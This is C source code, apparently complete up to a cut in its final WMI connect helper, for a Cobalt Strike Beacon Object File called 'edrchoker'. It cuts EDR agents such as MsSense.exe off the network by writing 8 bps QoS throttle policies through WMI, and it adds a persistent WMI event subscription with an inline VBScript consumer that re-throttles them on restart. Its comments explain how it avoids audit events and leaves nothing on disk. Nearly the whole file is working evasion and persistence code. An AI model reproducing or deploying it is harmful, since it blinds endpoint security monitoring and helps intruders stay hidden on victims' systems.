/*
 * edrchoker.bof.c — Beacon Object File
 *
 * PURPOSE
 * -------
 * Throttle any EDR/process to effectively 0 network throughput using the
 * Windows built-in QoS subsystem (pacer.sys), then install a persistent WMI
 * event subscription that automatically re-throttles the process if it restarts.
 *
 * WHY THIS WORKS (QoS layer)
 * --------------------------
 * pacer.sys is the Windows kernel QoS traffic-shaping driver.
 * Writing a MSFT_NetQosPolicySettingData object into ROOT\StandardCimv2 via WMI
 * registers a per-application bandwidth cap directly with pacer.sys.
 * pacer.sys sits BELOW the WFP (Windows Filtering Platform) stack, so:
 *   - No WFP filter is created  → no Event ID 5447 (EDR audit event)
 *   - No kernel driver is loaded → no BYOVD risk
 *   - No process injection       → no suspicious memory writes
 *   - Policy persists in WMI registry after reboot
 *
 * WHY THIS WORKS (WMI watchdog)
 * ------------------------------
 * WMI permanent event subscriptions (ROOT\subscription) survive reboot and run
 * entirely inside WmiPrvSE.exe (the WMI provider host). When the watched process
 * starts, WMI fires our ActiveScriptEventConsumer VBScript inline — no child
 * process is spawned, no new binary is dropped to disk.
 * Result: even if the EDR is killed and restarted, it gets re-throttled within
 * ~5 seconds (the WITHIN polling interval in the WQL filter query).
 *
 * MODES (set by CNA, packed as int before the process list)
 * ----------------------------------------------------------
 *   0 — THROTTLE + WATCH
 *         Create QoS policies for each process AND install WMI watchdog.
 *   1 — RESTORE (specific)
 *         Remove QoS policies for named processes. Network access returned.
 *         Does NOT remove the WMI watchdog (watchdog only re-throttles on
 *         process start, won't interfere with a process that is already running).
 *   2 — RESTORE ALL
 *         Remove all edrchoker QoS policies AND remove WMI watchdog.
 *
 * CNA USAGE
 * ---------
 *   edrchoker elastic.exe;MsSense.exe    MODE 0: throttle + watchdog
 *   edrchoker remove elastic.exe         MODE 1: restore specific
 *   edrchoker remove                     MODE 2: restore all + remove watchdog
 *
 * COMPILATION
 * -----------
 * MUST compile as C, not C++.
 *   wbemidl.h in C mode   → COM interfaces are typedef'd structs.
 *                            Vtable dispatch: obj->lpVtbl->Method(obj, ...)
 *   wbemidl.h in C++ mode → COM interfaces are abstract classes.
 *                            lpVtbl does not exist as a member → compile error.
 *
 *   mingw64:  x86_64-w64-mingw32-gcc -o edrchoker.x64.o -c edrchoker.bof.c -masm=intel
 *   MSVC:     cl /c /TC /GS- /Foedrchoker.x64.obj edrchoker.bof.c
 *
 * beacon.h: https://github.com/trustedsec/CS-Situational-Awareness-BOF
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include <wbemidl.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────────
 * BOFs cannot link against import libraries at load time.
 * The DECLSPEC_IMPORT + DLL$Function pattern instructs the BOF loader
 * (Cobalt Strike's beacon_inline_execute) to resolve these symbols from the
 * named DLL at runtime, then patch the call site before executing.          */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeSecurity(
    PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*,
    void*, DWORD, DWORD, void*, DWORD, void*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(
    const IID*, LPUNKNOWN, DWORD, const IID*, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(
    IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD,
    RPC_AUTH_IDENTITY_HANDLE, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);

DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantInit(VARIANTARG*);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG*);

DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT void*   WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);

/* ─── GUIDs ──────────────────────────────────────────────────────────────────
 * Normally resolved by linking wbemuuid.lib, which is not possible in a BOF.
 * Defined inline here instead.                                               */
/* CLSID_WbemLocator  {4590F811-1D3A-11D0-891F-00AA004B2E24} */
static const CLSID g_CLSID_WbemLocator =
    {0x4590F811, 0x1D3A, 0x11D0, {0x89,0x1F,0x00,0xAA,0x00,0x4B,0x2E,0x24}};
/* IID_IWbemLocator   {DC12A687-737F-11CF-884D-00AA004B2E24} */
static const IID g_IID_IWbemLocator =
    {0xDC12A687, 0x737F, 0x11CF, {0x88,0x4D,0x00,0xAA,0x00,0x4B,0x2E,0x24}};

/* ─── WMI subscription object names ─────────────────────────────────────────
 * Fixed names so the remove path (mode 2) always knows what to delete.      */
static const wchar_t g_FilterName[]   = L"edrcw_flt";
static const wchar_t g_ConsumerName[] = L"edrcw_csm";

/* ─── Persistent LCG seed ────────────────────────────────────────────────────
 * Global zero-initialized (BSS) — safe to use in BOFs (CS loader zeroes BSS).
 * Using a global rather than a local-static or per-call GetTickCount() seed
 * prevents duplicate policy names when two processes are throttled within the
 * same GetTickCount() tick (1 ms resolution).                                */
static DWORD g_randS = 0;

/* ─── VBScript payload ───────────────────────────────────────────────────────
 * Stored in ROOT\subscription\ActiveScriptEventConsumer.ScriptText.
 * WMI executes this script inside WmiPrvSE.exe when the event fires.
 * No child process is created. No binary is written to disk.
 *
 * TargetEvent.TargetInstance  → the Win32_Process object that was just created.
 * TargetEvent.TargetInstance.Name → the executable name (e.g. "MsSense.exe").
 *
 * Script creates a fresh MSFT_NetQosPolicySettingData entry, throttling the
 * newly started process to 8 bps before it has a chance to connect to its C2.
 *
 * VBScript string escaping in C:
 *   VBScript "winmgmts:\\.\ROOT\StandardCimv2"
 *   C literal L"winmgmts:\\\\.\\ROOT\\StandardCimv2"
 *   (each \ in VBScript → \\ in C; VBScript " → \" in C)                    */
static const wchar_t g_ScriptText[] =
    L"On Error Resume Next\n"
    L"Dim oSvc, oClass, oInst\n"
    L"Set oSvc   = GetObject(\"winmgmts:\\\\.\\ROOT\\StandardCimv2\")\n"
    L"Set oClass = oSvc.Get(\"MSFT_NetQosPolicySettingData\")\n"
    L"Set oInst  = oClass.SpawnInstance_\n"
    L"oInst.Name                      = \"ec_\" & TargetEvent.TargetInstance.Name\n"
    L"oInst.AppPathNameMatchCondition  = TargetEvent.TargetInstance.Name\n"
    L"oInst.ThrottleRateAction         = 8\n"
    L"oInst.IPProtocolMatchCondition   = 3\n"
    L"oInst.NetworkProfile             = 0\n"
    L"oInst.Owner                      = 1\n"
    L"oSvc.PutInstance oInst\n";

/* ═══════════════════════════════════════════════════════════════════════════
 * HELPER FUNCTIONS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Inline wchar_t tokenizer — no CRT wcstok needed.
 * Splits on ';'. Modifies buffer in-place (replaces ';' with L'\0').
 * Leading/trailing semicolons produce empty tokens that are silently skipped:
 *   "p1;p2;p3;" → "p1", "p2", "p3", NULL  (trailing ';' is safe)           */
static wchar_t* WNextTok(wchar_t** cursor) {
    wchar_t* start = *cursor;
    if (!start || *start == L'\0') return NULL;
    while (*start == L';') start++;                  /* skip leading ';'       */
    if (*start == L'\0') { *cursor = start; return NULL; }
    wchar_t* p = start;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *cursor = p + 1; }
    else            { *cursor = p; }
    return start;
}

/* Append src into dst starting at position pos.
 * Returns updated pos. Never writes past dst[max-1].                        */
static int WAppend(wchar_t* dst, int pos, int max, const wchar_t* src) {
    while (*src && pos < max - 1) dst[pos++] = *src++;
    return pos;
}

/* Substring search without CRT wcsstr.
 * Returns TRUE if haystack contains needle.                                 */
static BOOL WContains(const wchar_t* haystack, const wchar_t* needle) {
    if (!haystack || !needle || !*needle) return FALSE;
    for (int i = 0; haystack[i]; i++) {
        BOOL match = TRUE;
        for (int j = 0; needle[j]; j++) {
            if (!haystack[i+j] || haystack[i+j] != needle[j])
                { match = FALSE; break; }
        }
        if (match) return TRUE;
    }
    return FALSE;
}

/* Generate n random wchar_t characters into out[0..n], null-terminated.
 * Uses a global LCG seed (g_randS) so that consecutive calls within the
 * same millisecond tick always produce DIFFERENT names.
 * (A local seed re-seeded from GetTickCount each call would produce the
 * same name if two policies are created within the same 1 ms tick.)         */
static void RandName(wchar_t* out, int n) {
    static const wchar_t pool[] =
        L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    if (!g_randS) g_randS = KERNEL32$GetTickCount() | 1; /* init once, never 0 */
    for (int i = 0; i < n; i++) {
        g_randS = g_randS * 1664525u + 1013904223u;
        out[i]  = pool[(g_randS >> 16) % 62];
    }
    out[n] = L'\0';
}

/* Set a BSTR-valued WMI property. VariantClear frees the allocated BSTR.   */
static HRESULT PutBstr(IWbemClassObject* o, const wchar_t* prop, const wchar_t* val) {
    VARIANT v;
    OLEAUT32$VariantInit(&v);
    v.vt      = VT_BSTR;
    v.bstrVal = OLEAUT32$SysAllocString(val);
    HRESULT hr = o->lpVtbl->Put(o, prop, 0, &v, 0);
    OLEAUT32$VariantClear(&v);
    return hr;
}

/* Set a UINT64 WMI property (ThrottleRateAction is uint64 bits/sec).       */
static HRESULT PutUI8(IWbemClassObject* o, const wchar_t* prop, ULONGLONG val) {
    VARIANT v;
    OLEAUT32$VariantInit(&v);
    v.vt     = VT_UI8;
    v.ullVal = val;
    HRESULT hr = o->lpVtbl->Put(o, prop, 0, &v, 0);
    OLEAUT32$VariantClear(&v);
    return hr;
}

/* Set an INT32 WMI property.                                               */
static HRESULT PutI4(IWbemClassObject* o, const wchar_t* prop, LONG val) {
    VARIANT v;
    OLEAUT32$VariantInit(&v);
    v.vt   = VT_I4;
    v.lVal = val;
    HRESULT hr = o->lpVtbl->Put(o, prop, 0, &v, 0);
    OLEAUT32$VariantClear(&v);
    return hr;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * QoS — THROTTLE
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Read back the policy from WMI to confirm pacer.sys received it.
 * pacer.sys is notified by the WMI QoS provider immediately after PutInstance,
 * so a successful GetObject here means the kernel is already enforcing.     */
static void VerifyPolicy(IWbemServices* pSvc, const wchar_t* policyName) {
    /* Object path: MSFT_NetQosPolicySettingData.Name="<policyName>"          */
    wchar_t path[80];
    int p = 0;
    p = WAppend(path, p, 80, L"MSFT_NetQosPolicySettingData.Name=\"");
    p = WAppend(path, p, 80, policyName);
    if (p < 79) path[p++] = L'"'; path[p] = L'\0';

    BSTR bPath = OLEAUT32$SysAllocString(path);
    IWbemClassObject* pResult = NULL;
    HRESULT hr = pSvc->lpVtbl->GetObject(pSvc, bPath, 0, NULL, &pResult, NULL);
    OLEAUT32$SysFreeString(bPath);

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "      [!] Verify FAILED — policy '%S' not found in WMI (0x%08X)\n"
            "          pacer.sys may NOT be enforcing for this process.\n",
            policyName, hr);
        return;
    }

    VARIANT vT;
    OLEAUT32$VariantInit(&vT);
    pResult->lpVtbl->Get(pResult, L"ThrottleRateAction", 0, &vT, NULL, NULL);
    ULONGLONG bps = (vT.vt == VT_UI8) ? vT.ullVal : 0ULL;

    if (bps <= 8ULL)
        BeaconPrintf(CALLBACK_OUTPUT,
            "      [v] Confirmed in WMI: ThrottleRateAction = %llu bps\n"
            "          pacer.sys is enforcing — process cannot exceed ~0 bandwidth\n",
            (unsigned long long)bps);
    else
        BeaconPrintf(CALLBACK_ERROR,
            "      [!] ThrottleRateAction = %llu bps (expected <= 8)\n"
            "          Policy was written but value is unexpected — verify manually\n",
            (unsigned long long)bps);

    OLEAUT32$VariantClear(&vT);
    pResult->lpVtbl->Release(pResult);
}

/* Create a MSFT_NetQosPolicySettingData entry for one process.
 *
 * Key fields:
 *   AppPathNameMatchCondition — process name (basename only, case-insensitive).
 *                               pacer.sys matches all PIDs with this executable name.
 *   ThrottleRateAction        — max bandwidth in bits/sec. 8 bps ≈ 1 byte/sec.
 *                               At this rate TLS handshake (~6 KB) takes ~6000 s.
 *                               EDR C2 heartbeat is effectively silenced.
 *   IPProtocolMatchCondition  — 3 = TCP + UDP (covers all EDR telemetry transports).
 *   NetworkProfile            — 0 = all profiles (Domain + Private + Public).
 *   Owner                     — 1 = administrative policy (survives user logoff).
 *
 * Returns TRUE on success (policy created and verified in WMI).             */
static BOOL CreatePolicy(IWbemServices* pSvc, const wchar_t* processName) {
    HRESULT hr;

    /* Fetch the class definition to use as a template for the new instance   */
    BSTR cls = OLEAUT32$SysAllocString(L"MSFT_NetQosPolicySettingData");
    IWbemClassObject* pClass = NULL;
    hr = pSvc->lpVtbl->GetObject(pSvc, cls, 0, NULL, &pClass, NULL);
    OLEAUT32$SysFreeString(cls);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] '%S' — cannot get class definition (0x%08X)\n"
            "      ROOT\\StandardCimv2 may be unavailable. Is WMI running?\n",
            processName, hr);
        return FALSE;
    }

    /* SpawnInstance creates a blank in-memory instance ready for property set */
    IWbemClassObject* pInst = NULL;
    hr = pClass->lpVtbl->SpawnInstance(pClass, 0, &pInst);
    pClass->lpVtbl->Release(pClass);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] '%S' — SpawnInstance failed (0x%08X)\n", processName, hr);
        return FALSE;
    }

    /* Random 8-char policy name — avoids conflicts with existing policies     */
    wchar_t policyName[9];
    RandName(policyName, 8);

    PutBstr(pInst, L"Name",                     policyName);
    PutBstr(pInst, L"AppPathNameMatchCondition", processName);
    PutUI8 (pInst, L"ThrottleRateAction",        8ULL);   /* bits/sec           */
    PutI4  (pInst, L"IPProtocolMatchCondition",  3);      /* 1=TCP, 2=UDP, 3=both */
    PutI4  (pInst, L"NetworkProfile",            0);      /* 0=all, 1=domain, 2=private, 4=public */
    PutI4  (pInst, L"Owner",                     1);      /* 1=admin policy     */

    /* PutInstance writes the object to WMI, which notifies pacer.sys         */
    hr = pSvc->lpVtbl->PutInstance(pSvc, pInst,
                                   WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pInst->lpVtbl->Release(pInst);

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] '%S' — PutInstance failed (0x%08X)\n"
            "      Common causes: insufficient privilege, WMI provider error\n",
            processName, hr);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "  [+] '%S' — policy '%S' written to WMI\n",
        processName, policyName);
    VerifyPolicy(pSvc, policyName);
    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * QoS — RESTORE
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Build a WQL query selecting policies for specific processes:
 * SELECT * FROM MSFT_NetQosPolicySettingData
 *   WHERE AppPathNameMatchCondition = 'p1' OR AppPathNameMatchCondition = 'p2' */
static void BuildRemoveWQL(wchar_t* out, int max, wchar_t* listBuf) {
    int pos = WAppend(out, 0, max,
        L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ");
    wchar_t* cursor = listBuf;
    wchar_t* tok;
    BOOL first = TRUE;
    while ((tok = WNextTok(&cursor)) != NULL) {
        if (!first) pos = WAppend(out, pos, max, L" OR ");
        pos = WAppend(out, pos, max, L"AppPathNameMatchCondition = '");
        pos = WAppend(out, pos, max, tok);
        if (pos < max - 1) out[pos++] = L'\'';
        first = FALSE;
    }
    out[pos] = L'\0';
}

/* Run a WQL SELECT query, delete every object returned, report results.
 * Returns the number of objects successfully deleted.
 *
 * Safety: checks vPath.vt == VT_BSTR before using vPath.bstrVal.
 * Without this check, a NULL __PATH from WMI would crash on DeleteInstance.  */
static int ExecDeleteQuery(IWbemServices* pSvc, const wchar_t* wql) {
    BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
    BSTR query = OLEAUT32$SysAllocString(wql);
    IEnumWbemClassObject* pEnum = NULL;
    HRESULT hr = pSvc->lpVtbl->ExecQuery(pSvc, lang, query,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnum);
    OLEAUT32$SysFreeString(lang);
    OLEAUT32$SysFreeString(query);

    if (FAILED(hr) || !pEnum) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] WMI query failed (0x%08X) — no policies found or WMI error\n", hr);
        return 0;
    }

    IWbemClassObject* pObj = NULL;
    ULONG got = 0;
    int n = 0;

    while (pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &got) == S_OK) {
        VARIANT vPath, vName, vApp;
        OLEAUT32$VariantInit(&vPath);
        OLEAUT32$VariantInit(&vName);
        OLEAUT32$VariantInit(&vApp);

        pObj->lpVtbl->Get(pObj, L"__PATH",                    0, &vPath, NULL, NULL);
        pObj->lpVtbl->Get(pObj, L"Name",                      0, &vName, NULL, NULL);
        pObj->lpVtbl->Get(pObj, L"AppPathNameMatchCondition", 0, &vApp,  NULL, NULL);

        /* Guard: __PATH must be a BSTR. WMI can return VT_NULL in edge cases */
        if (vPath.vt == VT_BSTR && vPath.bstrVal) {
            hr = pSvc->lpVtbl->DeleteInstance(pSvc, vPath.bstrVal, 0, NULL, NULL);
            if (SUCCEEDED(hr)) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [+] Network RESTORED for '%S' (removed policy '%S')\n",
                    (vApp.vt == VT_BSTR && vApp.bstrVal) ? vApp.bstrVal : L"?",
                    (vName.vt == VT_BSTR && vName.bstrVal) ? vName.bstrVal : L"?");
                n++;
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [-] DeleteInstance failed (0x%08X)\n", hr);
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "  [-] Skipped object — __PATH property is NULL or wrong type\n");
        }

        OLEAUT32$VariantClear(&vPath);
        OLEAUT32$VariantClear(&vName);
        OLEAUT32$VariantClear(&vApp);
        pObj->lpVtbl->Release(pObj);
    }

    pEnum->lpVtbl->Release(pEnum);
    return n;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * WMI WATCHDOG — INSTALL
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Build the WQL query for the __EventFilter.
 * Watches ROOT\CIMV2 for Win32_Process creation events.
 * WITHIN 5 = poll interval in seconds (lower = more responsive, more CPU).
 * Result: fires within 5 s of a watched process starting.
 *
 * Example output for ["elastic.exe", "MsSense.exe"]:
 *   SELECT * FROM __InstanceCreationEvent WITHIN 5
 *   WHERE TargetInstance ISA 'Win32_Process'
 *   AND (TargetInstance.Name = 'elastic.exe' OR TargetInstance.Name = 'MsSense.exe') */
static void BuildWatchWQL(wchar_t* out, int max, wchar_t* listBuf) {
    int pos = WAppend(out, 0, max,
        L"SELECT * FROM __InstanceCreationEvent WITHIN 5 "
        L"WHERE TargetInstance ISA 'Win32_Process' AND (");
    wchar_t* cursor = listBuf;
    wchar_t* tok;
    BOOL first = TRUE;
    while ((tok = WNextTok(&cursor)) != NULL) {
        if (!first) pos = WAppend(out, pos, max, L" OR ");
        pos = WAppend(out, pos, max, L"TargetInstance.Name = '");
        pos = WAppend(out, pos, max, tok);
        if (pos < max - 1) out[pos++] = L'\'';
        first = FALSE;
    }
    if (pos < max - 1) out[pos++] = L')';
    out[pos] = L'\0';
}

/* Register three WMI objects in ROOT\subscription:
 *
 *  __EventFilter (edrcw_flt)
 *    Stores the WQL query. WMI continuously evaluates it.
 *    EventNamespace = ROOT\CIMV2 (where Win32_Process lives).
 *
 *  ActiveScriptEventConsumer (edrcw_csm)
 *    Stores the VBScript. WMI runs it inside WmiPrvSE.exe on match.
 *    ScriptingEngine = "VBScript".
 *    ScriptText = g_ScriptText (creates QoS policy for the new process).
 *
 *  __FilterToConsumerBinding
 *    Links the filter to the consumer. WMI uses this to know which consumer
 *    to fire when which filter matches.
 *    Reference paths use the \\.\ROOT\subscription: prefix.
 *
 * All three are WBEM_FLAG_CREATE_OR_UPDATE (idempotent — safe to re-run).   */
static void InstallSubscription(IWbemServices* pSub, const wchar_t* wqlQuery) {
    HRESULT hr;

    /* ── __EventFilter ───────────────────────────────────────────────────── */
    BSTR fltCls = OLEAUT32$SysAllocString(L"__EventFilter");
    IWbemClassObject* pFltCls = NULL;
    hr = pSub->lpVtbl->GetObject(pSub, fltCls, 0, NULL, &pFltCls, NULL);
    OLEAUT32$SysFreeString(fltCls);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] GetObject(__EventFilter) failed (0x%08X)\n"
            "      ROOT\\subscription namespace may be inaccessible.\n", hr);
        return;
    }
    IWbemClassObject* pFlt = NULL;
    hr = pFltCls->lpVtbl->SpawnInstance(pFltCls, 0, &pFlt);
    pFltCls->lpVtbl->Release(pFltCls);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] SpawnInstance(filter) failed (0x%08X)\n", hr);
        return;
    }
    PutBstr(pFlt, L"Name",           g_FilterName);
    PutBstr(pFlt, L"QueryLanguage",  L"WQL");
    PutBstr(pFlt, L"Query",          wqlQuery);
    PutBstr(pFlt, L"EventNamespace", L"ROOT\\CIMV2"); /* Win32_Process is in CIMV2 */
    hr = pSub->lpVtbl->PutInstance(pSub, pFlt, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pFlt->lpVtbl->Release(pFlt);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] PutInstance(filter) failed (0x%08X)\n", hr);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "  [+] __EventFilter '%S' registered\n"
        "      WMI will poll every 5s: %S\n",
        g_FilterName, wqlQuery);

    /* ── ActiveScriptEventConsumer ───────────────────────────────────────── */
    BSTR csmCls = OLEAUT32$SysAllocString(L"ActiveScriptEventConsumer");
    IWbemClassObject* pCsmCls = NULL;
    hr = pSub->lpVtbl->GetObject(pSub, csmCls, 0, NULL, &pCsmCls, NULL);
    OLEAUT32$SysFreeString(csmCls);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] GetObject(ActiveScriptEventConsumer) failed (0x%08X)\n"
            "      ActiveScriptEventConsumer may be disabled on this host.\n", hr);
        return;
    }
    IWbemClassObject* pCsm = NULL;
    hr = pCsmCls->lpVtbl->SpawnInstance(pCsmCls, 0, &pCsm);
    pCsmCls->lpVtbl->Release(pCsmCls);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] SpawnInstance(consumer) failed (0x%08X)\n", hr);
        return;
    }
    PutBstr(pCsm, L"Name",            g_ConsumerName);
    PutBstr(pCsm, L"ScriptingEngine", L"VBScript");
    PutBstr(pCsm, L"ScriptText",      g_ScriptText);
    hr = pSub->lpVtbl->PutInstance(pSub, pCsm, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pCsm->lpVtbl->Release(pCsm);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] PutInstance(consumer) failed (0x%08X)\n", hr);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "  [+] ActiveScriptEventConsumer '%S' registered\n"
        "      VBScript runs inside WmiPrvSE.exe — no child process spawned\n",
        g_ConsumerName);

    /* ── __FilterToConsumerBinding ───────────────────────────────────────── */
    /* Reference path format: \\.\ROOT\subscription:ClassName.Name="<name>"
     * The \\.\  prefix means local machine. WMI requires the full path here. */
    wchar_t filterRef[160], consumerRef[192];
    int p = 0;
    p = WAppend(filterRef, 0, 160, L"\\\\.\\ROOT\\subscription:__EventFilter.Name=\"");
    p = WAppend(filterRef, p, 160, g_FilterName);
    if (p < 159) filterRef[p++] = L'"'; filterRef[p] = L'\0';

    p = 0;
    p = WAppend(consumerRef, 0, 192,
        L"\\\\.\\ROOT\\subscription:ActiveScriptEventConsumer.Name=\"");
    p = WAppend(consumerRef, p, 192, g_ConsumerName);
    if (p < 191) consumerRef[p++] = L'"'; consumerRef[p] = L'\0';

    BSTR bndCls = OLEAUT32$SysAllocString(L"__FilterToConsumerBinding");
    IWbemClassObject* pBndCls = NULL;
    hr = pSub->lpVtbl->GetObject(pSub, bndCls, 0, NULL, &pBndCls, NULL);
    OLEAUT32$SysFreeString(bndCls);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] GetObject(binding) failed (0x%08X)\n", hr);
        return;
    }
    IWbemClassObject* pBnd = NULL;
    hr = pBndCls->lpVtbl->SpawnInstance(pBndCls, 0, &pBnd);
    pBndCls->lpVtbl->Release(pBndCls);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] SpawnInstance(binding) failed (0x%08X)\n", hr);
        return;
    }
    PutBstr(pBnd, L"Filter",   filterRef);
    PutBstr(pBnd, L"Consumer", consumerRef);
    hr = pSub->lpVtbl->PutInstance(pSub, pBnd, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pBnd->lpVtbl->Release(pBnd);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] PutInstance(binding) failed (0x%08X)\n", hr);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "  [+] __FilterToConsumerBinding linked filter -> consumer\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * WMI WATCHDOG — REMOVE
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Remove all three WMI subscription objects created by InstallSubscription.
 *
 * Binding deletion: we enumerate all __FilterToConsumerBinding objects and
 * delete those whose Filter reference contains our filter name.
 * This avoids constructing the binding's complex nested-quoted key path.
 *
 * Filter/Consumer deletion: done by their known __RELPATH strings.          */
static void RemoveSubscription(IWbemServices* pSub) {
    HRESULT hr;
    int removed = 0;

    /* ── Delete binding by enumeration ──────────────────────────────────── */
    BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
    BSTR query = OLEAUT32$SysAllocString(L"SELECT * FROM __FilterToConsumerBinding");
    IEnumWbemClassObject* pEnum = NULL;
    pSub->lpVtbl->ExecQuery(pSub, lang, query,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnum);
    OLEAUT32$SysFreeString(lang);
    OLEAUT32$SysFreeString(query);

    if (pEnum) {
        IWbemClassObject* pObj = NULL; ULONG got = 0;
        while (pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &got) == S_OK) {
            VARIANT vFlt, vPath;
            OLEAUT32$VariantInit(&vFlt); OLEAUT32$VariantInit(&vPath);
            pObj->lpVtbl->Get(pObj, L"Filter", 0, &vFlt,  NULL, NULL);
            pObj->lpVtbl->Get(pObj, L"__PATH", 0, &vPath, NULL, NULL);

            if (vFlt.vt  == VT_BSTR && vFlt.bstrVal &&
                vPath.vt == VT_BSTR && vPath.bstrVal &&
                WContains(vFlt.bstrVal, g_FilterName)) {
                if (SUCCEEDED(
                        pSub->lpVtbl->DeleteInstance(pSub, vPath.bstrVal, 0, NULL, NULL))) {
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "  [+] Removed __FilterToConsumerBinding\n");
                    removed++;
                }
            }
            OLEAUT32$VariantClear(&vFlt); OLEAUT32$VariantClear(&vPath);
            pObj->lpVtbl->Release(pObj);
        }
        pEnum->lpVtbl->Release(pEnum);
    }

    /* ── Delete filter ───────────────────────────────────────────────────── */
    wchar_t fltPath[128];
    int p = 0;
    p = WAppend(fltPath, p, 128, L"__EventFilter.Name=\"");
    p = WAppend(fltPath, p, 128, g_FilterName);
    if (p < 127) fltPath[p++] = L'"'; fltPath[p] = L'\0';

    BSTR bFlt = OLEAUT32$SysAllocString(fltPath);
    if (SUCCEEDED(pSub->lpVtbl->DeleteInstance(pSub, bFlt, 0, NULL, NULL))) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [+] Removed __EventFilter '%S'\n", g_FilterName);
        removed++;
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] __EventFilter '%S' not found (already removed?)\n", g_FilterName);
    }
    OLEAUT32$SysFreeString(bFlt);

    /* ── Delete consumer ─────────────────────────────────────────────────── */
    wchar_t csmPath[160];
    p = 0;
    p = WAppend(csmPath, p, 160, L"ActiveScriptEventConsumer.Name=\"");
    p = WAppend(csmPath, p, 160, g_ConsumerName);
    if (p < 159) csmPath[p++] = L'"'; csmPath[p] = L'\0';

    BSTR bCsm = OLEAUT32$SysAllocString(csmPath);
    if (SUCCEEDED(pSub->lpVtbl->DeleteInstance(pSub, bCsm, 0, NULL, NULL))) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [+] Removed ActiveScriptEventConsumer '%S'\n", g_ConsumerName);
        removed++;
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] ActiveScriptEventConsumer '%S' not found (already removed?)\n",
            g_ConsumerName);
    }
    OLEAUT32$SysFreeString(bCsm);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Watchdog cleanup: %d/3 objects removed\n", removed);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * WMI CONNECT HELPER
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Connect to a WMI namespace and set the proxy security blanket.
 * CoSetProxyBlanket is required so that out-of-process WMI calls from Beacon
 * (which runs under a service token) authenticate correctly to the WMI provider.
 * Returns NULL and prints an error on failure.                               */
static IWbemServices* WmiConnect(IWbemLocator* pLoc, const wchar_t* ns) {
    IWbemServices* pSvc = NULL;
    BSTR bns = OLEAUT32$SysAllocString(ns);
    HRESULT hr = pLoc->lpVtbl->ConnectServer(
